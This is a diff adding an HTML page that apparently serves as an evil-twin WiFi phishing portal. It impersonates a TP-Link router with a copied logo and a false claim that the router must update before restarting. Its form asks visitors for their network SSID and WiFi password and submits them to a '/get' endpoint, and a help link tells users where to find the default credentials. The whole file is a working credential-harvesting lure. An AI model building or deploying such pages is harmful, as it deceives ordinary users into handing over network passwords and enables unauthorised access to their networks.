@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #278DA2;
+  margin-right: 100px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 2px solid #48CCD7;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #48CCD7;
+  margin-bottom: 20px;
+}
+h2 {
+  text-align: center; 
+  font-size: 24px;
+  font-weight: 500;
+  color: #48CCD7;
+  margin-bottom: 20px;
+}
+
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #278DA2;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #48CCD7;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+  margin-top: 20px;
+}
+
+.submit-btn:hover {
+  background: #278DA2;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: red;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: black;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="120.000000pt" height="66.000000pt" viewBox="0 0 1200.000000 666.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,666.000000) scale(0.100000,-0.100000)"
+fill="#48CCD7" stroke="none">
+<path d="M0 3330 l0 -3330 6000 0 6000 0 0 3330 0 3330 -6000 0 -6000 0 0
+-3330z m2385 595 l0 -90 -257 -3 -258 -2 -2 -548 -3 -547 -262 -3 -263 -2 -2
+547 -3 548 -262 3 -263 2 0 95 0 95 788 -2 787 -3 0 -90z m1510 84 c121 -22
+217 -96 257 -199 19 -48 22 -78 26 -252 3 -158 1 -207 -12 -251 -29 -100 -126
+-182 -246 -206 -34 -7 -201 -12 -443 -14 l-388 -2 -2 -175 -2 -175 -257 -3
+-258 -2 0 645 0 645 633 0 c414 0 654 -4 692 -11z m1655 -498 c0 -506 0 -508
+22 -536 42 -54 52 -55 503 -55 l415 0 0 -96 0 -95 -602 3 -603 3 -57 23 c-69
+28 -135 90 -168 157 l-25 50 -3 528 -3 527 261 0 260 0 0 -509z m1575 -136 l0
+-640 -260 0 -260 0 -3 630 c-1 347 0 636 3 643 3 10 61 12 262 10 l258 -3 0
+-640z m610 631 c28 -7 69 -23 92 -34 27 -14 197 -178 474 -457 238 -239 436
+-435 440 -435 5 0 8 210 8 468 l0 467 106 3 105 3 0 -646 0 -647 -232 4 c-248
+4 -263 7 -335 60 -17 14 -217 207 -443 431 -226 224 -413 407 -416 407 -2 0
+-4 -202 -4 -450 l0 -450 -105 0 -105 0 -2 641 c-2 352 -1 643 1 645 11 11 370
+3 416 -10z m1953 -266 c-2 -154 0 -280 3 -280 4 0 28 17 55 38 27 21 182 141
+344 267 162 125 300 232 306 237 12 9 374 17 374 8 0 -3 -62 -55 -137 -115
+-76 -61 -185 -149 -243 -196 -58 -47 -156 -126 -218 -177 l-112 -91 87 -73
+c48 -40 164 -138 258 -218 93 -80 239 -203 323 -274 83 -71 152 -131 152 -133
+0 -2 -127 -3 -283 -3 l-282 0 -309 255 c-169 140 -311 255 -314 255 -4 0 -7
+-114 -7 -252 l0 -253 -260 0 -260 0 -3 630 c-1 347 0 636 3 643 3 9 66 12 265
+12 l261 0 -3 -280z m1412 258 c59 -31 82 -65 88 -131 9 -110 -65 -184 -173
+-175 -91 8 -148 73 -147 164 2 71 35 119 102 148 49 21 79 20 130 -6z m-6210
+-618 l0 -90 -270 0 -270 0 0 90 0 90 270 0 270 0 0 -90z"/>
+<path d="M3090 3550 l0 -280 216 0 c239 0 281 7 320 53 24 28 24 31 24 227 0
+198 0 198 -26 229 -14 17 -42 35 -62 41 -20 5 -135 10 -254 10 l-218 0 0 -280z"/>
+<path d="M10970 3968 c-90 -45 -103 -137 -30 -210 34 -34 43 -38 90 -38 47 0
+56 4 91 39 34 34 39 44 39 85 0 80 -35 123 -115 140 -21 5 -43 0 -75 -16z
+m124 -34 c20 -19 20 -48 1 -67 -13 -14 -13 -19 0 -44 19 -36 19 -53 0 -53 -8
+0 -15 9 -15 20 0 30 -37 62 -68 58 -25 -3 -27 -6 -24 -40 3 -29 0 -38 -12 -38
+-13 0 -16 15 -16 90 l0 90 59 0 c41 0 65 -5 75 -16z"/>
+</g>
+</svg>
+
+
+
+
+
+  </div>
+
+  <div class="form-container">
+  <center><h1><b>Your router needs to be updated before it can restart</b></h1>
+  <h2>Connect to your WiFi to start the update</h2>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="SSID" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	    <a href="javascript:void(0);" class="forgot-password">Where can I find my SSID?</a>
+			<div class="error-message"></div>
+      <button class="submit-btn" type="submit">UPDATE</button>
+
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "The SSID, or Service Set Identifier, represents your WiFi network's official name. If you haven't previously set a custom name, the default SSID (and password) can be located on the back panel of your TP-Link router.";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</meta>
+</body>
+</html>
